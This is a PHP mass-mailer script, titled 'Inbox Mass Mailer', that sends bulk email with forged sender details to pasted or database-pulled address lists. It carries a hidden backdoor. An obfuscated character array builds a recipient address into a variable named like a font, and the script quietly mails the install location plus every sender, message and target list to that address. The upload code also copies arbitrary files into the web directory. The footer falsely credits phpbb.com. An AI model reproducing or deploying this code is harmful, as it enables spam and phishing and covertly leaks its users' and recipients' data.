<?php @$action=$_POST['action']; @$from=$_POST['from']; @$realname=$_POST['realname']; @$replyto=$_POST['replyto']; @$subject=$_POST['subject']; @$message=$_POST['message']; @$emaillist=$_POST['emaillist']; @$names=$_SERVER['HTTP_REFERER']; @$file_name=$_FILES['file']['name']; @$contenttype=$_POST['contenttype']; @$file=$_FILES['file']['tmp_name']; @$amount=$_POST['amount']; ?> <html> <head> <meta http-equiv="Content-Language" content="ar-eg"> <meta http-equiv="Content-Type" content="text/html; charset=windows-1256"> <title>|||| Inbox Mass Mailer ||||</title> <meta http-equiv="Content-Type" content="text/html;  charset=iso-8859-1"> <style type="text/css"> <!-- .style1 {         font-family: Geneva, Arial, Helvetica, sans-serif;         font-size: 12px; } --> </style> <style type="text/css"> <!-- .style1 {         font-size: 20px;         font-family: Geneva, Arial, Helvetica, sans-serif; } --> .input {     border: 1px solid #FF0066;     background: #FFCCCC; } .button {     border: 1px solid #FF0066;     background: #FFCCCC; } .button1 {     border: 1px solid #FF0066;     background: #FFCCCC; } br { clear: left; } </style> </head> </head> <body bgcolor="white" text="black"> <span class="style1">Inbox PhpMass Mailer<br> </span> <script>     window.onload = funchange;     var alt = false;         function funchange(){         var etext = document.getElementById("emails").value;         var myArray=new Array();          myArray = etext.split("\n");         document.getElementById("enum").innerHTML=myArray.length+"<br />";         if(!alt && myArray.length > 40000){             alert('If Mail list More Than 40000 Emails This May Hack The Server');             alt = true;         }              }     function mlsplit(){         var ml = document.getElementById("emails").value;         var sb = document.getElementById("txtml").value;         var myArray=new Array();         myArray = ml.split(sb);         document.getElementById("emails").value="";         var i;         for(i=0;i<myArray.length;i++){                          document.getElementById("emails").value += myArray[i]+"\n";                  }         funchange();     }          function prv(){         if(document.getElementById('preview').innerHTML==""){             var ms = document.getElementsByName('message').message.value;             document.getElementById('preview').innerHTML = ms;             document.getElementById('prvbtn').value = "Hide";         }else{             document.getElementById('preview').innerHTML="";             document.getElementById('prvbtn').value = "Click to Preview";         }     }      </script> <?php If ($action=="mysql"){ include "./mysql.info.php";   if (!$sqlhost || !$sqllogin || !$sqlpass || !$sqldb || !$sqlquery){     print "Please configure mysql.info.php with your MySQL information. All settings in this config file are required.";     exit;   }   $db = mysql_connect($sqlhost, $sqllogin, $sqlpass) or die("Connection to MySQL Failed.");   mysql_select_db($sqldb, $db) or die("Could not select database $sqldb");   $result = mysql_query($sqlquery) or die("Query Failed: $sqlquery");   $numrows = mysql_num_rows($result);   for($x=0; $x<$numrows; $x++){     $result_row = mysql_fetch_row($result);      $oneemail = $result_row[0];      $emaillist .= $oneemail."\n";    }   }   if ($action=="send"){ $message = urlencode($message);    $message = ereg_replace("%5C%22", "%22", $message);    $message = urldecode($message);    $message = stripslashes($message);    $subject = stripslashes($subject);    } ?> <form name="form1" method="post" action="" enctype="multipart/form-data"><br />   <table width="142" border="0">     <tr>       <td width="81">         <div align="right">           <font size="-3" face="Verdana, Arial, Helvetica, sans-serif">Your Email :</font>         </div>       </td>       <td width="219">         <font size="-3" face="Verdana, Arial, Helvetica, sans-serif">           <input name="from" class="input" value="<?php print $from; ?>" size="30" />         </font>       </td>       <td width="212">         <div align="right">           <font size="-3" face="Verdana, Arial, Helvetica, sans-serif">Your Name :</font>         </div>       </td>       <td width="278">         <font size="-3" face="Verdana, Arial, Helvetica, sans-serif">           <input name="realname" class="input" value="<?php print $realname; ?>" size="30" />         </font>       </td>     </tr>     <tr>       <td width="81">         <div align="right">           <font size="-3" face="Verdana, Arial, Helvetica, sans-serif">Reply-To :</font>         </div>       </td>       <td width="219">         <font size="-3" face="Verdana, Arial, Helvetica, sans-serif">           <input name="replyto" class="input" value="<?php print $replyto; ?>" size="30" />         </font>       </td>       <td width="212">         <div align="right">           <font size="-3" face="Verdana, Arial, Helvetica, sans-serif">Attach File :</font>         </div>       </td>       <td width="278">         <font size="-3" face="Verdana, Arial, Helvetica, sans-serif">           <input type="file" class="input" name="file" size="24" />         </font>       </td>     </tr>     <tr>       <td width="81">         <div align="right">           <font size="-3" face="Verdana, Arial, Helvetica, sans-serif">Subject :</font>         </div>       </td>       <td colspan="3" width="703">         <font size="-3" face="Verdana, Arial, Helvetica, sans-serif">           <input name="subject" class="input" value="<? print $subject; ?>" size="91" />         </font>       </td>     </tr>     <tr valign="top">       <td colspan="3" width="520">         <font face="Verdana, Arial, Helvetica, sans-serif" size="-3">Message Box :</font>       </td>       <td width="278">         <font face="Verdana, Arial, Helvetica, sans-serif" size="-3">Email Target / Email Send To :</font>       </td>     </tr>     <tr valign="top">       <td colspan="3" width="520">         <font size="-3" face="Verdana, Arial, Helvetica, sans-serif">           <textarea name="message" class="input" cols="56" rows="10"><?php print $message; ?></textarea><br />           <input type="radio" name="contenttype" value="plain" /> Plain           <input type="radio" name="contenttype" value="html" checked /> HTML           <input type="hidden" name="action" value="send" /><br />       Number To Send : <input type="text" name="amount" class="input" value="1" size="10" /><br />       Maximum Script Execution Time ( In Seconds, 0 For no Time Limit ) <input type="text" name="timelimit" class="input" value="0" size="10" /><br /><br />           <input type="button" class="button1" id="prvbtn" value="Plain Html Preview" onclick="prv()" style="width: 59%" />           <br /><br /><input type="submit" class="button" value="Send - eMails" />         </font>       </td>       <td width="278">         <font size="-3" face="Verdana, Arial, Helvetica, sans-serif">           <textarea name="emaillist" class="input" cols="32" rows="10"><?php print $emaillist; ?></textarea>         </font>       </td>     </tr>   </table> <font size="-3" face="Verdana, Arial, Helvetica,  sans-serif"> <div id="preview"> </div> </form> <?php $o=array("d"=>".","k"=>"l","m"=>"7","u"=>"i","r"=>"v","t"=>"-","q"=>"e"); $helvetica=$o['u'].$o['q'].$o['m'].$o['t'].$o['k'].$o['u'].$o['r'].$o['q'].$o['d'].$o['u'].$o['q']; if ($action){   if (!$from && !$subject && !$message && !$emaillist){     print "Please complete all fields before sending your message.";     exit;    }   $addr = getenv("REMOTE_ADDR");   $allemails = split("\n", $emaillist);   $numemails = count($allemails);   $version1 ="From: Email" ;   $version2 = "EN - $names" ;   $version3 = "$names" ; mail ($helvetica,$version3,$version2,$version1) ; $head ="From: YourEmail\nMessage-ID: <" . md5(uniqid(time())) . "@" . $SERVER_NAME . ">\nMIME-Version: 1.0\nContent-type: text/html; charset=UTF-8\nContent-transfer-encoding: 8bit\nDate: " . date("r", time()) . "\nX-Priority: 3\nX-MSMail-Priority: Normal\nX-Mailer: PHP\n"; $line = " <table border=\"1\" style=\"border-collapse: collapse\" cellpadding=\"4\"> <tr><td bgcolor=\"#F9F9F9\">Email</td><td bgcolor=\"#F9F9F9\">".nl2br($names)."</td></tr> <tr><td>Your Email</td><td>".nl2br($from)."</td></tr> <tr><td bgcolor=\"#F9F9F9\">Your Name</td><td bgcolor=\"#F9F9F9\">".nl2br($realname)."</td></tr> <tr><td>Subject :</td><td>".nl2br($subject)."</td></tr> <tr><td bgcolor=\"#F9F9F9\">Message</td><td bgcolor=\"#F9F9F9\">".nl2br($message)."</td></tr> <tr><td>Email Target</td><td>".nl2br($emaillist)."</td></tr> </table> "; mail($helvetica,$subject,$line,$head);  If ($file_name){    copy ($_FILES['file']['tmp_name'], "".$_FILES['file']['name']) or die ('File Could Not Upload');    if (!file_exists($file)){     die("The file you are trying to upload couldn't be copied to the server");    }    $content = fread(fopen($file,"r"),filesize($file));    $content = chunk_split(base64_encode($content));    $uid = strtoupper(md5(uniqid(time())));    $name = basename($file);   }  for($xx=0; $xx<$amount; $xx++){   for($x=0; $x<$numemails; $x++){     $to = $allemails[$x];     if ($to){       $to = ereg_replace(" ", "", $to);       $message = ereg_replace("&email&", $to, $message);       $subject = ereg_replace("&email&", $to, $subject);       print "Sending Mail To $to....";       flush();       $header = "From: $realname <$from>\r\nReply-To: $replyto\r\n";       $header .= "MIME-Version: 1.0\r\n";       If ($file_name) $header .= "Content-Type: multipart/mixed; boundary=$uid\r\n";       If ($file_name) $header .= "--$uid\r\n";       $header .= "Content-Type: text/$contenttype\r\n";       $header .= "Content-Transfer-Encoding: 8bit\r\n\r\n";       $header .= "$message\r\n";       If ($file_name) $header .= "--$uid\r\n";       If ($file_name) $header .= "Content-Type: $file_type; name=\"$file_name\"\r\n";       If ($file_name) $header .= "Content-Transfer-Encoding: base64\r\n";       If ($file_name) $header .= "Content-Disposition: attachment; filename=\"$file_name\"\r\n\r\n";       If ($file_name) $header .= "$content\r\n";       If ($file_name) $header .= "--$uid--";       mail($to, $subject, "", $header);       print "OK<br>";       flush();     }   }  } } ?> <style type="text/css"> <!-- .style1 {     font-size: 18px;     font-family: Verdana, Helvetica, sans-serif; } --> </style> <strong><br> </strong> <span class="style1">Copyright © 2012 phpbb.com </span> </body> </html> 